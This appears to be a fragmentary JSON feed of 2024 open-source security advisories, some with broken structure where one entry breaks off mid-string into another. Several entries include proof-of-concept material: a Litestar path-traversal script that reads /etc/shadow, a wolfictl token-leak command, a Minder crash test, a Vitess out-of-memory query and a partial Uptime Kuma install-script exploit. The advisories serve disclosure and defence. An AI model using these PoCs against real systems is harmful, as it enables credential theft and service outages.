            "ecosystem": "GIT",
            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-35183' target='_blank'>CVE-2024-35183</a>",
            "details": "<b></b><br>wolfictl is a command line tool for working with Wolfi. A git authentication issue in versions prior to 0.16.10 allows a local user\u2019s GitHub token to be sent to remote servers other than `github.com`. Most git-dependent functionality in wolfictl relies on its own `git` package, which contains centralized logic for implementing interactions with git repositories. Some of this functionality requires authentication in order to access private repositories. A central function `GetGitAuth` looks for a GitHub token in the environment variable `GITHUB_TOKEN` and returns it as an HTTP basic auth object to be used with the `github.com&#x2F;go-git&#x2F;go-git&#x2F;v5` library. Most callers (direct or indirect) of `GetGitAuth` use the token to authenticate to github.com only; however, in some cases callers were passing this authentication without checking that the remote git repository was hosted on github.com. This behavior has existed in one form or another since commit 0d06e1578300327c212dda26a5ab31d09352b9d0 - committed January 25, 2023. This impacts anyone who ran the `wolfictl check update` commands with a Melange configuration that included a `git-checkout` directive step that referenced a git repository not hosted on github.com. This also impacts anyone who ran `wolfictl update &amp;lt;url&amp;gt;` with a remote URL outside of github.com. Additionally, these subcommands must have run with the `GITHUB_TOKEN` environment variable set to a valid GitHub token. Users should upgrade to version 0.16.10 to receive a patch.",
            "published": "2024-05-15T22:15:08Z",
            "severity": "0",
            "langs": "go",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/wolfi-dev/wolfictl/blob/488b53823350caa706de3f01ec0eded9350c7da7/pkg/update/update.go#L143'>https://github.com/wolfi-dev/wolfictl/blob/488b53823350caa706de3f01ec0eded9350c7da7/pkg/update/update.go#L143</a></li><li>- <a target='_blank' href='https://github.com/wolfi-dev/wolfictl/blob/4dd6c95abb4bc0f9306350a8601057bd7a92bded/pkg/update/deps/cleanup.go#L49'>https://github.com/wolfi-dev/wolfictl/blob/4dd6c95abb4bc0f9306350a8601057bd7a92bded/pkg/update/deps/cleanup.go#L49</a></li><li>- <a target='_blank' href='https://github.com/wolfi-dev/wolfictl/blob/6d99909f7b1aa23f732d84dad054b02a61f530e6/pkg/git/git.go#L22'>https://github.com/wolfi-dev/wolfictl/blob/6d99909f7b1aa23f732d84dad054b02a61f530e6/pkg/git/git.go#L22</a></li></ul>"
        }, {
            "ecosystem": "Go",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-8fg7-hp93-qhvr' target='_blank'>GHSA-8fg7-hp93-qhvr</a>",
            "details": "<b>wolfictl leaks GitHub tokens to remote non-GitHub git servers</b><br>### Summary\n\nA git authentication issue allows a local user\u2019s GitHub token to be sent to remote servers other than `github.com`.\n\n### Details\n\nMost git-dependent functionality in wolfictl relies on its own `git` package, which contains centralized logic for implementing interactions with git repositories. Some of this functionality requires authentication in order to access private repositories. There\u2019s a central function `GetGitAuth`:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;wolfi-dev&#x2F;wolfictl&#x2F;blob&#x2F;6d99909f7b1aa23f732d84dad054b02a61f530e6&#x2F;pkg&#x2F;git&#x2F;git.go#L22\n\nThis looks for a GitHub token in the environment variable `GITHUB_TOKEN` and returns it as an HTTP basic auth object to be used with the `github.com&#x2F;go-git&#x2F;go-git&#x2F;v5` library.\n\nMost callers (direct or indirect) of `GetGitAuth` use the token to authenticate to github.com only; however, in some cases callers were passing this authentication without checking that the remote git repository was hosted on github.com.\n\n#### Issue 1\n\nOne of these callers processed git URLs from Melange package configurations, cloning the package\u2019s upstream repository in order to determine which project dependencies have been upgraded since the prior update.\n\nhttps:&#x2F;&#x2F;github.com&#x2F;wolfi-dev&#x2F;wolfictl&#x2F;blob&#x2F;4dd6c95abb4bc0f9306350a8601057bd7a92bded&#x2F;pkg&#x2F;update&#x2F;deps&#x2F;cleanup.go#L49\n\nThis issue affects the command `wolfictl check update`, and the set of remote git hosts is a function of the Melange package configuration files residing in the local directory specified in the command.\n\n#### Issue 2\n\nAnother caller processes a git URL received as a command line argument and clones the repository to look for new available versions of the given project.\n\nhttps:&#x2F;&#x2F;github.com&#x2F;wolfi-dev&#x2F;wolfictl&#x2F;blob&#x2F;488b53823350caa706de3f01ec0eded9350c7da7&#x2F;pkg&#x2F;update&#x2F;update.go#L143\n\nThis issue affects the command `wolfictl update`.\n\n---\n\nThis behavior has existed in one form or another since https:&#x2F;&#x2F;github.com&#x2F;wolfi-dev&#x2F;wolfictl&#x2F;commit&#x2F;0d06e1578300327c212dda26a5ab31d09352b9d0 - committed January 25, 2023.\n\n### PoC\n\n```shell\nGITHUB_TOKEN=test wolfictl update http:&#x2F;&#x2F;git.example.com&#x2F;\n```\n\nExamining traffic sent to the remote server will show that the HTTP `Authorization` header contains `test` in base64 encoded format.\n\n### Impact\n\nThis impacts anyone who ran the `wolfictl check update` commands with a Melange configuration that included a `git-checkout` directive step that referenced a git repository not hosted on github.com. \n\nThis also impacts anyone who ran `wolfictl update &amp;lt;url&amp;gt;` with a remote URL outside of github.com. \n\nAdditionally, these subcommands must have run with the `GITHUB_TOKEN` environment variable set to a valid GitHub token.\n",

            "severity": "4.4",
            "langs": "go",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/wolfi-dev/wolfictl/security/advisories/GHSA-8fg7-hp93-qhvr'>https://github.com/wolfi-dev/wolfictl/security/advisories/GHSA-8fg7-hp93-qhvr</a></li><li>- <a target='_blank' href='https://github.com/wolfi-dev/wolfictl/commit/0d06e1578300327c212dda26a5ab31d09352b9d0'>https://github.com/wolfi-dev/wolfictl/commit/0d06e1578300327c212dda26a5ab31d09352b9d0</a></li><li>- <a target='_blank' href='https://github.com/wolfi-dev/wolfictl/commit/403e93569f46766b4e26e06cf9cd0cae5ee0c2a2'>https://github.com/wolfi-dev/wolfictl/commit/403e93569f46766b4e26e06cf9cd0cae5ee0c2a2</a></li><li>- <a target='_blank' href='https://github.com/wolfi-dev/wolfictl'>https://github.com/wolfi-dev/wolfictl</a></li><li>- <a target='_blank' href='https://github.com/wolfi-dev/wolfictl/blob/488b53823350caa706de3f01ec0eded9350c7da7/pkg/update/update.go#L143'>https://github.com/wolfi-dev/wolfictl/blob/488b53823350caa706de3f01ec0eded9350c7da7/pkg/update/update.go#L143</a></li><li>- <a target='_blank' href='https://github.com/wolfi-dev/wolfictl/blob/4dd6c95abb4bc0f9306350a8601057bd7a92bded/pkg/update/deps/cleanup.go#L49'>https://github.com/wolfi-dev/wolfictl/blob/4dd6c95abb4bc0f9306350a8601057bd7a92bded/pkg/update/deps/cleanup.go#L49</a></li><li>- <a target='_blank' href='https://github.com/wolfi-dev/wolfictl/blob/6d99909f7b1aa23f732d84dad054b02a61f530e6/pkg/git/git.go#L22'>https://github.com/wolfi-dev/wolfictl/blob/6d99909f7b1aa23f732d84dad054b02a61f530e6/pkg/git/git.go#L22</a></li></ul>"

            "details": "<b>dotmesh arbitrary file read and&#x2F;or write</b><br>Dotmesh is a git-like command-line interface for capturing, organizing and sharing application states. In versions 0.8.1 and prior, the unsafe handling of symbolic links in an unpacking routine may enable attackers to read and&#x2F;or write to arbitrary locations outside the designated target folder.\u00a0The routine `untarFile` attempts to guard against creating symbolic links that point outside the directory a tar archive is extracted to. However, a malicious tarball first linking `subdir&#x2F;parent` to `..` (allowed, because `subdir&#x2F;..` falls within the archive root) and then linking `subdir&#x2F;parent&#x2F;escapes` to `..` results in a symbolic link pointing to the tarball\u2019s parent directory, contrary to the routine\u2019s goals. This issue may lead to arbitrary file write (with same permissions as the program running the unpack operation) if the attacker can control the archive file. Additionally, if the attacker has read access to the unpacked files, they may be able to read arbitrary system files the parent process has permissions to read. As of time of publication, no patch for this issue is available.\n",

            "details": "<b>Uncontrolled resource consumption in braces</b><br>The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib&#x2F;parse.js,` if a malicious user sends &quot;imbalanced braces&quot; as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.\n",

            "details": "<b>Regular Expression Denial of Service (ReDoS) in micromatch</b><br>The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn&#x27;t find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https:&#x2F;&#x2F;github.com&#x2F;micromatch&#x2F;micromatch&#x2F;pull&#x2F;266. This issue should be mitigated by using a safe pattern that won&#x27;t start backtracking the regular expression due to greedy matching.\n",

            "details": "<b>Malicious Long Unicode filenames may cause a Multiple Application-level Denial of Service</b><br>**Important: Exploiting this vulnerability requires the attacker to have access to your Frigate instance, which means they could also just delete all of your recordings or perform any other action. If you have configured authentication in front of Frigate via a reverse proxy, then this vulnerability is not exploitable without first getting around your authentication method. For many obvious reasons in addition to this one, please don&#x27;t expose your Frigate instance publicly without any kind of authentication.**\n\n## Summary\n\nWhen uploading a file or retrieving the filename, a user may intentionally use a large Unicode filename which would lead to a application-level denial of service. This is due to no limitation set on the length of the filename and the costy use of the Unicode normalization with the form NFKD under the hood of `secure_filename()`.\n\nI idenfied multiple vulnerable paths on [blakeblackshear&#x2F;frigate](https:&#x2F;&#x2F;www.github.com&#x2F;blakeblackshear&#x2F;frigate&#x2F;) repository. In all of those paths, it was possible for a malicious user to send a filename equals to the output of : `python3 -c &quot;print(&#x27;\u2100&#x27; * 1_000_000)&quot;` which would reach the werkzeug `secure_filename()` call , which in turn under the hood uses a compatibility Unicode normalization with NFKC&#x2F;NFKD form. In sum, the latter call would be costly in matter of CPU resource and may lead to the application-level denial of service. \n\n## Vulnerable Paths\n\n&amp;lt;details&amp;gt;\n&amp;lt;summary&amp;gt;Path with 2 steps&amp;lt;&#x2F;summary&amp;gt;\n\n1. [frigate&#x2F;api&#x2F;media.py](https:&#x2F;&#x2F;github.com&#x2F;blakeblackshear&#x2F;frigate&#x2F;blob&#x2F;d7ae0eedf89e14f297093ac5c8042862034cbaeb&#x2F;frigate&#x2F;api&#x2F;media.py#L379C20-L379C31)\n   &amp;lt;pre&amp;gt;&amp;lt;code class=&quot;python&quot;&amp;gt             "details": "<b>Consensus failures in github.com&#x2F;btcsuite&#x2F;btcd</b><br>Incorrect implementation of the consensus rules outlined in BIP 68 and BIP 112 making btcd susceptible to consensus failures. Specifically, it uses the transaction version as a signed integer when it is supposed to be treated as unsigned. There can be a chain split and loss of funds.",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-649x-hxfx-57j2' target='_blank'>GHSA-649x-hxfx-57j2</a>",
            "details": "<b>Vitess vulnerable to infinite memory consumption and vtgate crash</b><br>### Summary\n\nWhen executing the following simple query, the `vtgate` will go into an endless loop that also keeps consuming memory and eventually will OOM.\n\n### Details\n\nWhen running the following query, the `evalengine` will try evaluate it and runs forever.\n\n```\nselect _utf16 0xFF\n```\n\nThe source of the bug lies in the collation logic that we have. The bug applies to all `utf16`,  `utf32` and `ucs2` encodings.  In general, the bug is there for any encoding where the minimal byte length for a single character is more than 1 byte.\n\nThe decoding functions for these collations all implement logic like the following to enforce the minimal character length:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;vitessio&#x2F;vitess&#x2F;blob&#x2F;8f6cfaaa643a08dc111395a75a2d250ee746cfa8&#x2F;go&#x2F;mysql&#x2F;collations&#x2F;charset&#x2F;unicode&#x2F;utf16.go#L69-L71\n\nThe problem is that all the callers of `DecodeRune` expect progress by returning the number of bytes consumed. This means that if there&#x27;s only 1 byte left in an input, it will here return still `0` and the caller(s) don&#x27;t consume the character. \n\nOne example of such a caller is the following:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;vitessio&#x2F;vitess&#x2F;blob&#x2F;8f6cfaaa643a08dc111395a75a2d250ee746cfa8&#x2F;go&#x2F;mysql&#x2F;collations&#x2F;charset&#x2F;convert.go#L73-L79\n\nThe logic here moves forward the pointer in the input `[]byte` but if `DecodeRune` returns `0` in case of error, it will keep running forever. The OOM happens since it keeps adding the `?` as the invalid character to the destination buffer infinitely, growing forever until it runs out of memory.\n\nThe fix here would be to always return forward progress also on invalid strings. \n\nThere&#x27;s also a separate bug here that even if progress is guaranteed, `select _utf16 0xFF` will return the wrong result currently. MySQL will pad here the input when the `_utf16` introducer is used with leading `0x00` bytes and then decode to UTF-16, resulting in the output of `\u00ff` here. \n\n### PoC\n\n```\nselect _utf16 0xFF\n```\n\n### Impact\n\nDenial of service attack by triggering unbounded memory usage.",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-9c5w-9q3f-3hv7' target='_blank'>GHSA-9c5w-9q3f-3hv7</a>",
            "details": "<b>Minder&#x27;s GitHub Webhook Handler vulnerable to DoS from un-validated requests</b><br>Minder&#x27;s `HandleGithubWebhook` is susceptible to a denial of service attack from an untrusted HTTP request. The vulnerability exists before the request has been validated, and as such the request is still untrusted at the point of failure. This allows an attacker with the ability to send requests to `HandleGithubWebhook` to crash the Minder controlplane and deny other users from using it.\n\nOne of the first things that `HandleGithubWebhook` does is to validate the payload signature. This is done by way of the internal helper `validatePayloadSignature`:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;ee66f6c0763212503c898cfefb65ce1450c7f5ac&#x2F;internal&#x2F;controlplane&#x2F;handlers_githubwebhooks.go#L213-L218\n\n`validatePayloadSignature` generates a reader from the incoming request by way of the internal helper `readerFromRequest`:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;ee66f6c0763212503c898cfefb65ce1450c7f5ac&#x2F;internal&#x2F;controlplane&#x2F;handlers_githubwebhooks.go#L337-L342\n\nTo create a reader from the incoming request, `readerFromRequest` first reads the request body entirely into memory on line 368:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;ee66f6c0763212503c898cfefb65ce1450c7f5ac&#x2F;internal&#x2F;controlplane&#x2F;handlers_githubwebhooks.go#L367-L377\n\nThis is a vulnerability, since an HTTP request with a large body can exhaust the memory of the machine running Minder and cause the Go runtime to crash Minder.\n\nNote that this occurs before Minder has validated the request, and as such, the request is still untrusted.\n\nTo test this out, we can use the existing `TestHandleWebHookRepository` unit test and modify the HTTP request body to be large. \n\nTo do that, change these lines:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;stacklok&#x2F;minder&#x2F;blob&#x2F;ee66f6c0763212503c898cfefb65ce1450c7f5ac&#x2F;internal&#x2F;controlplane&#x2F;handlers_githubwebhooks_test.go#L278-L283\n\n... to these lines:\n```go\n\tpackageJson, err := json.Marshal(event)\n\trequire.NoError(t, err, &quot;failed to marshal package event&quot;)\n\n        maliciousBody := strings.NewReader(strings.Repeat(&quot;1337&quot;, 1000000000))\n        maliciousBodyReader := io.MultiReader(maliciousBody, maliciousBody, maliciousBody, maliciousBody, maliciousBody)\n        _ = packageJson\n\n\tclient := &amp;http.Client{}\n\treq, err := http.NewRequest(&quot;POST&quot;, fmt.Sprintf(&quot;http:&#x2F;&#x2F;%s&quot;, addr), maliciousBodyReader)\n\trequire.NoError(t, err, &quot;failed to create request&quot;)\n```\n\nThen run the unit test again. WARNING, SAVE ALL WORK BEFORE DOING THIS.\n\nOn my local machine, this causes the machine to freeze, and Go finally performs a sigkill: \n\n```\nsignal: killed\nFAIL      github.com&#x2F;stacklok&#x2F;minder&#x2F;internal&#x2F;controlplane          30.759s\nFAIL\n```",
            "published": "2024-05-07T13:02:42Z",

            "references": "<ul><li>- <a target='_blank' href='https://github.com/stacklok/minder/security/advisories/GHSA-9c5w-9q3f-3hv7'>https://github.com/stacklok/minder/security/advisories/GHSA-9c5w-9q3f-3hv7</a></li><li>- <a target='_blank' href='https://github.com/stacklok/minder/commit/3e5a527d2f1b535159206161d1d519602c75bd0d'>https://github.com/stacklok/minder/commit/3e5a527d2f1b535159206161d1d519602c75bd0d</a></li><li>- <a target='_blank' href='https://github.com/stacklok/minder'>https://github.com/stacklok/minder</a></li><li>- <a target='_blank' href='https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L213-L218'>https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L213-L218</a></li><li>- <a target='_blank' href='https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L337-L342'>https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L337-L342</a></li><li>- <a target='_blank' href='https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L367-L377'>https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L367-L377</a></li><li>- <a target='_blank' href='https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks_test.go#L278-L283'>https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks_test.go#L278-L283</a></li></ul>"

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-32982' target='_blank'>CVE-2024-32982</a>",
            "details": "<b></b><br>Litestar and Starlite is an Asynchronous Server Gateway Interface (ASGI) framework. Prior to 2.8.3, 2.7.2, and 2.6.4, a Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of LiteStar. This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server. The vulnerability is located in the file path handling mechanism within the static content serving function, specifically at `litestar&#x2F;static_files&#x2F;base.py`. This vulnerability is fixed in versions 2.8.3, 2.7.2, and 2.6.4.",
            "published": "2024-05-06T15:15:23Z",
            "severity": "0",
            "langs": "py",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70'>https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70</a></li></ul>"
        }, {
            "ecosystem": "PyPI",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf' target='_blank'>GHSA-83pv-qr33-2vcf</a>",
            "details": "<b>Litestar and Starlite vulnerable to Path Traversal</b><br># Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https:&#x2F;&#x2F;github.com&#x2F;litestar-org&#x2F;litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar&#x2F;static_files&#x2F;base.py`](https:&#x2F;&#x2F;github.com&#x2F;litestar-org&#x2F;litestar&#x2F;blob&#x2F;main&#x2F;litestar&#x2F;static_files&#x2F;base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[&quot;name&quot;], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath(&#x27;&#x2F;Users&#x2F;brian&#x2F;sandbox&#x2F;test_vuln&#x2F;static&#x27;)\nfile_info[&quot;name&quot;] = &#x27;&#x2F;Users&#x2F;brian&#x2F;sandbox&#x2F;test_vuln&#x2F;static&#x2F;..&#x2F;requirements.txt&#x27;\njoined_path = PosixPath(&#x27;&#x2F;Users&#x2F;brian&#x2F;sandbox&#x2F;test_vuln&#x2F;static&#x2F;..&#x2F;requirements.txt&#x27;)\n```\n\nThe function outputs &#x27;&#x2F;Users&#x2F;brian&#x2F;sandbox&#x2F;test_vuln&#x2F;static&#x27;, incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `&#x2F;etc&#x2F;shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=&quot;&#x2F;static&quot;, directories=[&quot;static&quot;]),\n        ],\n    )\n\n    if __name__ == &quot;__main__&quot;:\n        uvicorn.run(&quot;main:app&quot;, host=&quot;0.0.0.0&quot;, port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(&quot;GET&quot;, path)\n        response = connection.getresponse()\n        print(f&quot;Status: {response.status}&quot;)\n        print(f&quot;Headers: {response.getheaders()}&quot;)\n        data = response.read()\n        print(f&quot;Body: {data.decode(&#x27;utf-8&#x27;)}&quot;)\n        connection.close()\n\n    send_request(&quot;localhost&quot;, 8000, &quot;&#x2F;static&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;shadow&quot;)\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `&#x2F;etc&#x2F;shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https:&#x2F;&#x2F;github.com&#x2F;litestar-org&#x2F;litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `&#x2F;etc&#x2F;passwd` or `&#x2F;etc&#x2F;shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization&#x27;s reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere&#x27;s the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https:&#x2F;&#x2F;github.com&#x2F;litestar-org&#x2F;litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `..&#x2F;` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`..&#x2F;`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don&#x27;t allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette&#x27;s implementation](https:&#x2F;&#x2F;github.com&#x2F;encode&#x2F;starlette&#x2F;blob&#x2F;master&#x2F;starlette&#x2F;staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name &quot;starlite.&quot;\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name &quot;litestar.&quot;\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.",

            "details": "<b>kurwov vulnerable to Denial of Service due to improper data sanitization</b><br>### Summary\nAn unsafe sanitization of dataset contents on the `MarkovData#getNext` method used in `Markov#generate` and `Markov#choose` allows a maliciously crafted string on the dataset to throw and stop the function from running properly.\n\n### Details\nhttps:&#x2F;&#x2F;github.com&#x2F;xiboon&#x2F;kurwov&#x2F;blob&#x2F;0d58dfa42135ab40e830e92622857282f980ca89&#x2F;src&#x2F;MarkovData.ts#L38-L44\n\nIf a string contains a forbidden substring (i.e. `__proto__`) followed by a space character, the second line will access a special property in `MarkovData#finalData` by removing the last character of the string, bypassing the dataset sanitization (as it is supposed to be already sanitized before this function is called).\n\n`data` is then defined as the special function found in its prototype instead of an array.\n\nOn the last line, `data` is then indexed by a random number, which is supposed to return a string but returns undefined as it&#x27;s a function. Calling `endsWith` then throws.\n\n### PoC\nhttps:&#x2F;&#x2F;runkit.com&#x2F;embed&#x2F;m6uu40r5ja9b\n\n### Impact\nAny dataset can be contaminated with the substring making it unable to properly generate anything in some cases.",

            "details": "<b></b><br>Yamux is a stream multiplexer over reliable, ordered connections such as TCP&#x2F;IP. The Rust implementation of the Yamux stream multiplexer uses a vector for pending frames. This vector is not bounded in length. Every time the Yamux protocol requires sending of a new frame, this frame gets appended to this vector. This can be remotely triggered in a number of ways, for example by: 1. Opening a new libp2p Identify stream. This causes the node to send its Identify message. Of course, every other protocol that causes the sending of data also works. The larger the response, the more data is enqueued. 2. Sending a Yamux Ping frame. This causes a Pong frame to be enqueued. Under normal circumstances, this queue of pending frames would be drained once they\u2019re sent out over the network. However, the attacker can use TCP\u2019s receive window mechanism to prevent the victim from sending out any data: By not reading from the TCP connection, the receive window will never be increased, and the victim won\u2019t be able to send out any new data (this is how TCP implements backpressure). Once this happens, Yamux\u2019s queue of pending frames will start growing indefinitely. The queue will only be drained once the underlying TCP connection is closed. An attacker can cause a remote node to run out of memory, which will result in the corresponding process getting terminated by the operating system.\n",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-7grx-f945-mj96' target='_blank'>GHSA-7grx-f945-mj96</a>",
            "details": "<b>Uptime Kuma vulnerable to authenticated remote code execution via malicious plugin installation</b><br>### Summary\nInstallation of a maliciously crafted plugin allows for remote code execution by an authenticated attacker.\n\n### Details\nUptime Kuma allows authenticated users to install plugins from an official list of plugins. This feature is currently disabled in the web interface, but the corresponding API endpoints are still available after login.\nAfter downloading a plugin, it&#x27;s installed by calling `npm install` in the installation directory of the plugin:\nhttps:&#x2F;&#x2F;github.com&#x2F;louislam&#x2F;uptime-kuma&#x2F;blob&#x2F;8c60e902e1c76ecbbd1b0423b07ce615341cb850&#x2F;server&#x2F;plugins-manager.js#L210-L216\n\nBecause the plugin is not validated against the official list of plugins or installed with `npm install --ignore-scripts`, a maliciously crafted plugin taking advantage of [npm scripts](https:&#x2F;&#x2F;docs.npmjs.com&#x2F;cli&#x2F;v9&#x2F;using-npm&#x2F;scripts) can gain remote code execution.\n\n### PoC\nIn the PoC below, the plugin at https:&#x2F;&#x2F;github.com&#x2F;n-thumann&#x2F;npm-install-script-poc will be installed. It only consists of an empty `index.js` and a `package.json` containing the script: `&quot;preinstall&quot;: &quot;echo \\&quot;Malicious code could have been executed as user $(whoami)\\&quot; &amp;gt; &#x2F;tmp&#x2F;poc&quot;`. This will be executed when installing the plugin.\n\n1. Start Uptime Kuma: `docker run -d -p 3001:3001 -v uptime-kuma:&#x2F;app&#x2F;data --name uptime-kuma louislam&#x2F;uptime-kuma:1`\n2. Create a user using the Uptime Kuma web interface, e.g. user `admin` with password `admin123`\n3. Confirm that the PoC file to be created doesn&#x27;t exist yet:\n```\n\u279c  ~ docker exec -it uptime-kuma cat &#x2F;tmp&#x2F;poc\ncat: &#x2F;tmp&#x2F;poc: No such file or directory\n```\n4. Create file `poc.js` with the following content:\n```\nSERVER = &quot;ws:&#x2F;&#x2F;localhost:3001&quot;;\nUSERNAME = &quot;admin&quot;;\nPASSWORD = &quot;admin123&quot;;\n\n\nconst { io } = require(&quot;socket.io-client&quot;);\nconst socket = io(SERVER);\nconst repo = 